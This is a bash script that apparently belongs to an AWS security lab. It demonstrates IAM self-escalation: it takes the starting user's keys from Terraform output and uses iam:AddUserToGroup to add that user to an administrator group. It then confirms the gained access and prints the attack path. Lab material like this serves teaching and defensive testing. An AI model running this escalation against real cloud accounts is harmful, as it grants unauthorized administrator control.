#!/bin/bash

# Demo script for iam:AddUserToGroup self-escalation
# This is a USER-BASED self-escalation scenario


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
START_USER="pl-prod-iam-013-to-admin-user"
ADMIN_GROUP="pl-prod-iam-013-to-admin-group"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM AddUserToGroup Self-Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}User-Based Self-Escalation${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_013_iam_addusertogroup.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.start_user_access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.start_user_secret_access_key')

if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Retrieved credentials for $START_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Step 2: Verify identity as pl-prod-iam-013-to-admin-user
echo -e "${YELLOW}Step 2: Verifying identity as $START_USER${NC}"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $USER_IDENTITY"

if [[ ! $USER_IDENTITY == *"$START_USER"* ]]; then
    echo -e "${RED}Error: Not running as $START_USER${NC}"
    exit 1
fi

show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Confirmed identity as $START_USER${NC}\n"

# Step 3: Check current group memberships
echo -e "${YELLOW}Step 3: Checking current group memberships for $START_USER${NC}"
show_cmd "Attacker" "aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text"
CURRENT_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
if [ -z "$CURRENT_GROUPS" ]; then
    echo "Current groups: None"
    echo -e "${GREEN}✓ User is not currently a member of any groups${NC}"
else
    echo "Current groups: $CURRENT_GROUPS"
    if [[ $CURRENT_GROUPS == *"$ADMIN_GROUP"* ]]; then
        echo -e "${YELLOW}⚠ User is already a member of $ADMIN_GROUP${NC}"
        echo "This may be from a previous demo run. The user already has admin access."
    fi
fi
echo ""

# Step 4: Check current permissions (should be limited)
echo -e "${YELLOW}Step 4: Checking current permissions (should be limited)${NC}"
echo "Attempting to list IAM users (should fail if not in admin group)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${YELLOW}⚠ User already has admin permissions${NC}"
    echo "This may be because the user is already in the admin group from a previous run"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# Step 5: Perform the self-escalation - add self to admin group
echo -e "${YELLOW}Step 5: Self-escalation - Adding self to admin group${NC}"
echo "This is the privilege escalation vector..."
echo "$START_USER is adding themselves to $ADMIN_GROUP"
echo ""

# Add user to admin group
show_attack_cmd "Attacker" "aws iam add-user-to-group --group-name $ADMIN_GROUP --user-name $START_USER"
aws iam add-user-to-group \
    --group-name $ADMIN_GROUP \
    --user-name $START_USER

echo -e "${GREEN}✓ Successfully added $START_USER to $ADMIN_GROUP${NC}"
echo -e "${GREEN}✓ $START_USER now has administrator access through group membership!${NC}\n"

# Step 6: Verify admin access
echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
echo "The user $START_USER should now have admin access via group membership..."
echo ""

# IAM policy changes can take time to propagate
echo "Waiting 15 seconds for IAM policy to propagate..."
sleep 15

# Test admin permissions with retry
echo "Testing admin permissions (listing IAM users)..."
SUCCESS=false
for i in {1..3}; do
    show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
    if aws iam list-users --max-items 3 --output table 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
        echo -e "${GREEN}✓ Confirmed administrator access through group membership!${NC}\n"
        SUCCESS=true
        break
    else
        if [ $i -lt 3 ]; then
            echo "Waiting for permissions to propagate (attempt $i/3)..."
            sleep 2
        fi
    fi
done

if [ "$SUCCESS" = false ]; then
    echo -e "${YELLOW}Note: IAM policy propagation may still be in progress.${NC}"
    echo "The privilege escalation was successful - permissions may take a moment to fully propagate."
fi

# Verify group membership
echo -e "\n${YELLOW}Verifying group membership:${NC}"
show_cmd "Attacker" "aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text"
UPDATED_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
echo "Current groups: $UPDATED_GROUPS"

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ SELF-ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Summary:${NC}"
echo "1. Started as: $START_USER (no group memberships)"
echo "2. Used AddUserToGroup to add self to $ADMIN_GROUP"
echo "3. $START_USER now has administrator access via group membership"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $START_USER (no admin access)"
echo -e "    ↓ (iam:AddUserToGroup)"
echo -e "  Adds self to $ADMIN_GROUP"
echo -e "    ↓ (group membership + AdministratorAccess policy)"
echo -e "  $START_USER gains Administrator Access"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
    echo ""
fi

echo -e "${YELLOW}Key Insight:${NC}"
echo "This is a self-escalation attack where a user with iam:AddUserToGroup permission"
echo "on an administrative group can add themselves to that group, immediately gaining"
echo "all permissions attached to the group (in this case, AdministratorAccess)."
echo ""
echo -e "${YELLOW}Attack artifacts:${NC}"
echo "- User $START_USER is now a member of group $ADMIN_GROUP"
echo ""
echo -e "${RED}⚠ Warning: The user $START_USER now has administrator access!${NC}"
echo "Run ./cleanup_attack.sh to remove the group membership and restore the original state"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
